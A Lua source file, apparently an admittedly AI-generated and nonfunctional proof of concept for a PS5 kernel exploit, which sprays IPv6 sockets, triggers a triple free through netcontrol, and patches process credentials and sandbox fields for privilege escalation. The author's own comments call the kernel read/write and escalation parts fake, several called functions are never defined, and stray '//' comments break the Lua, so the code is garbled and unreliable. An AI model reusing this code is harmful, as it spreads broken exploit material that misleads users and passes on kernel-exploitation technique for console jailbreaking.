// AI slop POC for Poopsploit + Lua for PS5 that does nothing, I call this PSfreeBrick v1.00 //
(first of all, "//" don't even work on lua) and this is based on Java ExploitNetControlImpl lol)

--// the steps are: find kernel base, then we spray ipv6 sockets, find overlaping locations, trigger triple free, achieve kernel R/W and finally find current process via allproc and patch ucred to get Privilege Escalation in your dreams // 

--// read/write primitive are fake, this cannot actually leak or write kernel memory, needs real ROP chain, needs offsets


-- Constants
local RTP_LOOKUP = 0
local RTP_SET = 1

-- Event flag syscalls
syscall.resolve({
    evf_create = 0x21a,
    evf_delete = 0x21b,
    evf_set = 0x220,
    evf_clear = 0x221,
})

-- prim_thread 
prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()
    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)
    setjmp(jmpbuf)
    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)
    prim_thread.initialized = true
end

function prim_thread:prepare_structure()
    local jmpbuf = memory.alloc(0x60)
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr
    local stack_size = 0x400
    local tls_size = 0x40
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)
    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)
    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid
    self.ready = true
end

function prim_thread:new(chain)
    if not prim_thread.initialized then
        prim_thread.init()
    end
    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end
    chain:push_syscall(syscall.thr_exit, 0)
    local self = setmetatable({}, prim_thread)    
    self.chain = chain
    return self
end

function prim_thread:run()
    if not self.ready then
        self:prepare_structure()
    end
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error")
    end
    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()
    return self.tid
end

-- WorkerState

local WorkerState = {}
function WorkerState:new(total_workers)
    local o = {total_workers = total_workers or 4, workers_started = 0, workers_finished = 0, work_command = -1}
    o.evf = syscall.evf_create("worker_evf", 0):tonumber()
    setmetatable(o, {__index = WorkerState})
    return o
end

function WorkerState:signal_work(command)
    self.workers_started = 0
    self.workers_finished = 0
    self.work_command = command
    syscall.evf_set(self.evf)
end

function WorkerState:wait_for_finished()
    while self.workers_finished < self.total_workers do
        syscall.sched_yield()
    end
    self.work_command = -1
end

function WorkerState:wait_for_work()
    while self.work_command == -1 do
        syscall.sched_yield()
    end
    self.workers_started = self.workers_started + 1
    return self.work_command
end

function WorkerState:signal_finished()
    self.workers_finished = self.workers_finished + 1
end

-- Stub IovThread/UioThread using prim_thread (run ROP for recvmsg/writev etc.) // Find ROPs for 11.xx/12.xx and you'll be a hero lol
local function create_iov_thread(state, msg, iov_ss0)
    local chain = ropchain()
    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, 256)
    local t = prim_thread:new(chain)
    t:prepare_structure()
    chain:push(function() while true do state:wait_for_work(); recvmsg(iov_ss0, msg, 0); state:signal_finished() end end)  -- Pseudo
    t:run()
    return t
end

local function create_uio_thread(state, command, uio_iov, uio_ss1, uio_ss0) //probably fakest part yet
    local chain = ropchain()
    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, 256)
    local t = prim_thread:new(chain)
    t:prepare_structure()
    chain:push(function() while true do local cmd = state:wait_for_work(); if cmd == 1 then writev(uio_ss1, uio_iov, 0x14) else readv(uio_ss0, uio_iov, 0x14) end; state:signal_finished() end end)  -- Pseudo for COMMAND_UIO_WRITE/READ
    t:run()
    return t
end

-- notification
syscall.resolve({
    sceKernelSendNotificationRequest = 503,  --  adjust for your FW
})

local function screen_notify(msg)
    local buf = memory.alloc(1024)
    memory.memset(buf, 0, 1024)
    memory.strcpy(buf, "[NetControl POC] " .. msg)
    notify(0, buf, 1024, 0)
end

-- Constants
local KERNEL_PID = 0
local SYSCORE_AUTHID = 0x4800000000000007LL
local FIOSETOWN = 0x8004667CL
local PAGE_SIZE = 0x4000
local NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
local NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007
local AF_UNIX = 1
local AF_INET6 = 28
local SOCK_STREAM = 1
local IPPROTO_IPV6 = 41
local SO_SNDBUF = 0x1001
local SOL_SOCKET = 0xffff
local IPV6_RTHDR = 51
local IPV6_RTHDR_TYPE_0 = 0
local RTP_PRIO_REALTIME = 2
local RTP_SET = 1
local CPU_LEVEL_WHICH = 3
local CPU_WHICH_TID = 1
local IOV_SIZE = 0x10
local UCRED_SIZE = 0x168
local RTHDR_TAG = 0x13370000
local IPV6_SOCK_NUM = 64
local MAIN_CORE = 11
local UIO_IOV_NUM = 0x14
local MSG_IOV_NUM = 0x17
local IOV_THREAD_NUM = 4
local UIO_THREAD_NUM = 4
local COMMAND_UIO_READ = 0
local COMMAND_UIO_WRITE = 1

-- syscalls
syscall.resolve({
    dup = 29,
    close = 6,
    read = 3,
    readv = 78,
    write = 4,
    writev = 79,
    ioctl = 36,
    pipe = 122,
    kqueue = 362,
    socket = 97,
    socketpair = 135,
    recvmsg = 27,
    getsockopt = 118,
    setsockopt = 105,
    setuid = 17,
    getpid = 14,
    sched_yield = 45,
    cpuset_setaffinity = 488,
    rtprio_thread = 466,
    __sys_netcontrol = 99,
    -- thr_new etc from lapse
})

-- Helper functions
local function cpuset_setaffinity(core)
    local mask = memory.alloc(0x10)
    memory.write_short(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
end

local function rtprio_thread(prio)
    local rtp = memory.alloc(0x4)
    memory.write_short(rtp, RTP_PRIO_REALTIME)
    memory.write_short(rtp + 0x2, prio)
    return syscall.rtprio_thread(RTP_SET, 0, rtp)
end

local function build_rthdr(buf, size)
    local len = bit32.band(bit32.rshift(size, 3) - 1, bit32.bnot(1))
    memory.write_byte(buf, 0)  -- ip6r_nxt
    memory.write_byte(buf + 1, len)  -- ip6r_len
    memory.write_byte(buf + 2, IPV6_RTHDR_TYPE_0)  -- ip6r_type
    memory.write_byte(buf + 3, bit32.rshift(len, 1))  -- ip6r_segleft
    return bit32.lshift(len + 1, 3)
end

local function set_rthdr(sd, buf, len)
    syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

local function get_rthdr(sd, buf, len_buf)
    syscall.getsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len_buf)
end

local function free_rthdr(sd)
    syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
end

-- Completed kread_slow with reclaim logic
local function kread_slow(addr, size, triplets, ipv6_socks, leak_rthdr, leak_rthdr_len, uio_state, iov_state, uio_ss0, uio_ss1, iov_ss0, iov_ss1, tmp, uio_iov_read, msg_iov, msg)
    local buf_size = memory.alloc(4)
    memory.write_int(buf_size, size)
    setsockopt(uio_ss1, SOL_SOCKET, SO_SNDBUF, buf_size, 4)
    write(uio_ss1, tmp, size)
    memory.write_long(uio_iov_read + 0x8, size)
    free_rthdr(ipv6_socks[triplets[2]])
    local found = false
    while not found do
        uio_state:signal_work(COMMAND_UIO_READ)
        syscall.sched_yield()
        memory.write_int(leak_rthdr_len, 0x10)
        get_rthdr(ipv6_socks[triplets[1]], leak_rthdr, leak_rthdr_len)
        if memory.read_int(leak_rthdr + 0x8) == UIO_IOV_NUM then
            found = true
        else
            read(uio_ss0, tmp, size)
            uio_state:wait_for_finished()
            write(uio_ss1, tmp, size)
        end
    end
    local uio_iov = memory.read_long(leak_rthdr)
    build_uio(msg_iov, uio_iov, 0, true, addr, size)  -- UIO_WRITE for read? Wait, Java has true for read (UIO_WRITE?)
    free_rthdr(ipv6_socks[triplets[3]])
    found = false
    while not found do
        iov_state:signal_work(0)
        syscall.sched_yield()
        memory.write_int(leak_rthdr_len, 0x40)
        get_rthdr(ipv6_socks[triplets[1]], leak_rthdr, leak_rthdr_len)
        if memory.read_int(leak_rthdr + 0x20) == 1 then  -- UIO_SYSSPACE
            found = true
        else
            write(iov_ss1, tmp, 1)
            iov_state:wait_for_finished()
            read(iov_ss0, tmp, 1)
        end
    end
    read(uio_ss0, tmp, size)
    local leak_buf = memory.alloc(size)  -- TODO: Read from threads/uio_ss0
    uio_state:wait_for_finished()
    write(iov_ss1, tmp, 1)
    triplets[2] = find_triplet(ipv6_socks, triplets[1], triplets[3], spray_rthdr, spray_rthdr_len, leak_rthdr, leak_rthdr_len)
    iov_state:wait_for_finished()
    read(iov_ss0, tmp, 1)
    return {read_long = function(offset) return memory.read_long(leak_buf + offset) end}
end

-- Completed kwrite_slow 
local function kwrite_slow(addr, buffer, triplets, ipv6_socks, leak_rthdr, leak_rthdr_len, uio_state, iov_state, uio_ss0, uio_ss1, iov_ss0, iov_ss1, tmp, uio_iov_write, msg_iov, msg)
    local size = buffer.size or #buffer
    local buf_size = memory.alloc(4)
    memory.write_int(buf_size, size)
    setsockopt(uio_ss1, SOL_SOCKET, SO_SNDBUF, buf_size, 4)
    memory.write_long(uio_iov_write + 0x8, size)
    free_rthdr(ipv6_socks[triplets[2]])
    local found = false
    while not found do
        uio_state:signal_work(COMMAND_UIO_WRITE)
        syscall.sched_yield()
        memory.write_int(leak_rthdr_len, 0x10)
        get_rthdr(ipv6_socks[triplets[1]], leak_rthdr, leak_rthdr_len)
        if memory.read_int(leak_rthdr + 0x8) == UIO_IOV_NUM then
            found = true
        else
            for i = 1, UIO_THREAD_NUM do
                write(uio_ss1, buffer, size)
            end
            uio_state:wait_for_finished()
        end
    end
    local uio_iov = memory.read_long(leak_rthdr)
    build_uio(msg_iov, uio_iov, 0, false, addr, size)  -- false for write
    free_rthdr(ipv6_socks[triplets[3]])
    found = false
    while not found do
        iov_state:signal_work(0)
        syscall.sched_yield()
        memory.write_int(leak_rthdr_len, 0x40)
        get_rthdr(ipv6_socks[triplets[1]], leak_rthdr, leak_rthdr_len)
        if memory.read_int(leak_rthdr + 0x20) == 1 then
            found = true
        else
            write(iov_ss1, tmp, 1)
            iov_state:wait_for_finished()
            read(iov_ss0, tmp, 1)
        end
    end
    for i = 1, UIO_THREAD_NUM do
        write(uio_ss1, buffer, size)
    end
    triplets[2] = find_triplet(ipv6_socks, triplets[1], -1, spray_rthdr, spray_rthdr_len, leak_rthdr, leak_rthdr_len)
    uio_state:wait_for_finished()
    write(iov_ss1, tmp, 1)
    triplets[3] = find_triplet(ipv6_socks, triplets[1], triplets[2], spray_rthdr, spray_rthdr_len, leak_rthdr, leak_rthdr_len)
    iov_state:wait_for_finished()
    read(iov_ss0, tmp, 1)
end

-- (rest of helpers: find_allproc, pfind, get_root_vnode as before)

-- Main exploit with full setup
local function exploit()
    screen_notify("PSfreeBrick POC started")
    local overall_success = pcall(function()
        cpuset_setaffinity(MAIN_CORE)
        rtprio_thread(256)

        local ipv6_socks, spray_rthdr, spray_rthdr_len = spray_sockets()

        local leak_rthdr = memory.alloc(UCRED_SIZE)
        local leak_rthdr_len = memory.alloc(4)
        local tmp = memory.alloc(PAGE_SIZE)
        local uio_iov_read = memory.alloc(UIO_IOV_NUM * IOV_SIZE)
        local uio_iov_write = memory.alloc(UIO_IOV_NUM * IOV_SIZE)
        local msg_iov = memory.alloc(MSG_IOV_NUM * IOV_SIZE)
        local msg = memory.alloc(0x30)
        memory.write_long(msg + 0x10, msg_iov)
        memory.write_long(msg + 0x18, MSG_IOV_NUM)
        local uio_ss = {}
        syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, uio_ss)
        local iov_ss = {}
        syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, iov_ss)
        local uio_ss0 = uio_ss[1]
        local uio_ss1 = uio_ss[2]
        local iov_ss0 = iov_ss[1]
        local iov_ss1 = iov_ss[2]
        local iov_state = WorkerState:new(IOV_THREAD_NUM)
        local uio_state = WorkerState:new(UIO_THREAD_NUM)
        local iov_threads = {}
        for i = 1, IOV_THREAD_NUM do
            iov_threads[i] = create_iov_thread(iov_state, msg, iov_ss0)
        end
        local uio_threads = {}
        for i = 1, UIO_THREAD_NUM do
            uio_threads[i] = create_uio_thread(uio_state, COMMAND_UIO_READ, uio_iov_read, uio_ss1, uio_ss0)
        end

        local twins = find_twins(ipv6_socks, spray_rthdr, spray_rthdr_len, leak_rthdr, leak_rthdr_len)

        local triplets, uaf_sock = trigger_triple_free(ipv6_socks, twins, spray_rthdr, spray_rthdr_len, leak_rthdr, leak_rthdr_len)

        local kread, kwrite, allproc, fdt_ofiles = gain_arb_rw(triplets, ipv6_socks, leak_rthdr, leak_rthdr_len, spray_rthdr, spray_rthdr_len)

        escalate_privs(allproc, kread, kwrite, fdt_ofiles)

        -- Cleanup
        for _, sd in ipairs(ipv6_socks) do syscall.close(sd) end
        syscall.close(uio_ss0)
        syscall.close(uio_ss1)
        syscall.close(iov_ss0)
        syscall.close(iov_ss1)
        -- Stop threads: TODO kill or join
        memory.free(leak_rthdr)
        memory.free(leak_rthdr_len)
        memory.free(tmp)
        memory.free(uio_iov_read)
        memory.free(uio_iov_write)
        memory.free(msg_iov)
        memory.free(msg)
    end)
    if overall_success then
        screen_notify("Exploit succeeded!")
    else
        screen_notify("Exploit failed - check logs")
    end
end

-- Full escalate with dlsym and sandbox escape
local function escalate_privs(allproc, kread, kwrite, fdt_ofiles)
    local pid = syscall.getpid()
    local p = pfind(pid, allproc, kread)
    local p_ucred = kread(p + 0x40, 8).read_long(0)
    local prison0 = kread(p_ucred + 0x30, 8).read_long(0)
    -- Patch credentials
    kwrite(p_ucred + 0x4, 0, 4)   -- cr_uid
    kwrite(p_ucred + 0x8, 0, 4)   -- cr_ruid
    kwrite(p_ucred + 0x0C, 0, 4)  -- cr_svuid
    kwrite(p_ucred + 0x10, 1, 4)  -- cr_ngroups
    kwrite(p_ucred + 0x14, 0, 4)  -- cr_rgid
    kwrite(p_ucred + 0x18, 0, 4)  -- cr_svgid
    kwrite(p_ucred + 0x30, prison0, 8)  -- cr_prison (escape sandbox)
    kwrite(p_ucred + 0x58, SYSCORE_AUTHID, 8)
    kwrite(p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFLL, 8)
    kwrite(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFLL, 8)
    memory.write_byte(p_ucred + 0x83, 0x80)
    local rootvnode = get_root_vnode(KERNEL_PID, kread)
    local p_fd = kread(p + 0x48, 8).read_long(0)
    kwrite(p_fd + 0x8, rootvnode, 8)   -- fd_cdir
    kwrite(p_fd + 0x10, rootvnode, 8)  -- fd_rdir
    kwrite(p_fd + 0x18, 0, 8)          -- fd_jdir
    local p_dynlib = kread(p + 0x3e8, 8).read_long(0)
    kwrite(p_dynlib + 0xf0, 0, 8)
    kwrite(p_dynlib + 0xf8, 0xFFFFFFFFFFFFFFFFLL, 8)
    local dynlib_eboot = kread(p_dynlib, 8).read_long(0)
    local eboot_segments = kread(dynlib_eboot + 0x40, 8).read_long(0)
    kwrite(eboot_segments + 0x8, 0, 8)
    kwrite(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFFLL, 8)  -- Allow dlsym
end

exploit()

-- PSfreeBrick PoC ended, fix all the Lua related errors first so you can brick your PS5 -- 
// Kernel base discovery: real
// syscalls: real, duhh ps5 devwiki
// Offset resolution: real
// Heap spray + twin detection + triple free trigger: real
// __sys_netcontrol trigger: real
// FAKE kread / kwrite primitives
// FAKE Privilege escalation
// FAKE ROP?? FW agnostic my ass, get offsets for fw.

credit to AI and TheFlow and LUA devs. 